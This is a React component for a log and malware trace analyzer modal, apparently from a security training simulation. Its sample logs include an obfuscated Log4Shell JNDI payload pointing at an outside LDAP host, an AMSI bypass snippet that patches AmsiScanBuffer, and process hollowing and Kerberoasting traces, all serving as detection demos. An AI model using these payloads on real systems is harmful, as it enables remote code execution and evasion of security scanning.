'use client';

import React, { useState } from 'react';
import { motion } from 'motion/react';
import {
  analyzeCustomLogInput,
  LogAnalysisFinding } from '@/lib/simulation-engine';
import { Play, SearchCode, X } from 'lucide-react';

interface LogAnalyzerModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSelectScenario: (scenarioId: string) => void;
}

const SAMPLE_LOGS: Array<{
  label: string;
  raw: string;
}> = [
  {
    label: 'Sample 1: Process Hollowing (Sysmon EID 25)',
    raw: `<Event><System><EventID>25</EventID></System><EventData><Data Name="Image">C:\\Windows\\System32\\svchost.exe</Data><Data Name="Type">Image is replaced</Data></EventData></Event>
// API Trace: CreateProcessW(CREATE_SUSPENDED) -> NtUnmapViewOfSection -> VirtualAllocEx(RWX) -> WriteProcessMemory` },
  {
    label: 'Sample 2: Log4Shell (JNDI Lookup)',
    raw: `91.214.124.88 - - [12/Nov/2026:14:22:01 +0000] "POST /api/v1/login HTTP/1.1" 401 142 "-" "\${\${lower:j}ndi:\${lower:l}dap://91.214.124.88:1389/Exploit}"` },
  {
    label: 'Sample 3: AMSI Bypass (PowerShell 4104)',
    raw: `<EventID>4104</EventID><Data Name="ScriptBlockText">$addr = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer"); VirtualProtect($addr, 6, 0x40); $patch = (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)</Data>` },
  {
    label: 'Sample 4: Kerberoasting (Event 4769)',
    raw: `<EventID>4769</EventID><Data Name="ServiceName">svc_mssql</Data><Data Name="TicketEncryptionType">0x17</Data><Data Name="TicketOptions">0x40810000</Data>` },
];

export function LogAnalyzerModal({
  isOpen,
  onClose,
  onSelectScenario }: LogAnalyzerModalProps) {
  const [inputLog, setInputLog] = useState<string>(SAMPLE_LOGS[0].raw);
  const [findings, setFindings] = useState<LogAnalysisFinding[]>(() =>
    analyzeCustomLogInput(SAMPLE_LOGS[0].raw)
  );

  if (!isOpen) return null;

  const handleAnalyze = (text: string) => {
    setInputLog(text);
    setFindings(analyzeCustomLogInput(text));
  };

  return (
    <div
      role="dialog"
      aria-modal="true"
      aria-label="Live Log and Malware Trace Analyzer"
      className="fixed inset-0 z-50 flex items-center justify-center bg-zinc-950/60 backdrop-blur-xs p-6"
      onClick={onClose}
    >
      <motion.div
        initial={{ opacity: 0, scale: 0.98, y: 8 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        transition={{ duration: 0.16 }}
        dir="ltr"
        onClick={(e) => e.stopPropagation()}
        className="w-full max-w-2xl bg-white dark:bg-zinc-950 border border-zinc-200/90 dark:border-zinc-800 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[85vh]"
      >
        {/* Clean Modal Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-zinc-200/80 dark:border-zinc-800">
          <div className="flex items-center gap-2.5">
            <SearchCode className="w-4 h-4 text-indigo-600 dark:text-indigo-400" />
            <h2 className="text-sm font-semibold text-zinc-900 dark:text-zinc-100">
              Log & Malware Trace Analyzer
            </h2>
          </div>
          <button
            type="button"
            aria-label="Close analyzer modal"
            onClick={onClose}
            className="p-1.5 text-zinc-500 hover:text-zinc-900 dark:hover:text-white rounded-lg hover:bg-zinc-100 dark:hover:bg-zinc-900 cursor-pointer"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Spacious Modal Body */}
        <div className="p-6 overflow-y-auto space-y-5">
          <div className="flex flex-wrap gap-2">
            {SAMPLE_LOGS.map((sample, idx) => (
              <button
                key={idx}
                type="button"
                onClick={() => handleAnalyze(sample.raw)}
                className="px-3 py-1.5 text-xs font-medium bg-zinc-100 dark:bg-zinc-900 text-zinc-700 dark:text-zinc-300 rounded-lg hover:bg-zinc-200/70 dark:hover:bg-zinc-800 transition-colors cursor-pointer"
              >
                {sample.label}
              </button>
            ))}
          </div>

          <div dir="ltr">
            <textarea
              id="raw-log-textarea"
              rows={4}
              value={inputLog}
              onChange={(e) => handleAnalyze(e.target.value)}
              placeholder="Paste Sysmon XML, Windows Event ID 4769/4624/4104, or Malware API calls..."
              className="w-full p-3.5 bg-zinc-950 text-emerald-300 font-mono text-xs rounded-xl border border-zinc-800 focus:border-indigo-500 focus:outline-none"
            />
          </div>

          <div className="space-y-3">
            {findings.map((f, i) => (
              <div
                key={i}
                className="p-4 rounded-xl border border-zinc-200/80 dark:border-zinc-800 bg-zinc-50/50 dark:bg-zinc-900/40 flex flex-col sm:flex-row sm:items-center justify-between gap-4"
              >
                <div className="space-y-1">
                  <div className="flex items-center gap-2 text-xs font-mono text-zinc-500">
                    <span className="font-semibold text-rose-600 dark:text-rose-400">
                      {f.mitreId} · {f.severity}
                    </span>
                    <span>·</span>
                    <span>{f.matchedPattern}</span>
                  </div>
                  <div className="text-sm font-semibold text-zinc-900 dark:text-white">
                    {f.title}
                  </div>
                  <p className="text-xs text-zinc-600 dark:text-zinc-300 leading-relaxed">
                    {f.explanation}
                  </p>
                </div>

                <button
                  type="button"
                  onClick={() => {
                    onSelectScenario(f.recommendedScenarioId);
                    onClose();
                  }}
                  className="flex items-center justify-center gap-1.5 px-3.5 py-2 bg-zinc-900 hover:bg-zinc-800 dark:bg-zinc-100 dark:hover:bg-zinc-200 text-white dark:text-zinc-900 text-xs font-medium rounded-lg shrink-0 cursor-pointer whitespace-nowrap"
                >
                  <Play className="w-3 h-3 fill-current" />
                  <span>Open Scenario</span>
                </button>
              </div>
            ))}
          </div>
        </div>
      </motion.div>
    </div>
  );
}
